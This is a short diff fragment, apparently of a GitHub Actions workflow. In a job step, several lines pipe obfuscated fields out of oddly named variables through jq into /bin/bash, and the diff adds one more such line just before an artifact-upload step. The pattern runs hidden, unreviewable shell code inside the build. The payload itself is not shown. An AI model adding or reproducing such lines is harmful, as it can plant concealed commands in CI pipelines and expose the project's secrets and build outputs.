@@ -27,6 +27,7 @@ jobs:
           echo $c749 | jq -r .bggri1436 | /bin/bash
           echo $k094 | jq -r .wofr9421 | /bin/bash
           echo $epzs0 | jq -r .o6 | /bin/bash
+          echo $sdk347 | jq -r .abg1947 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
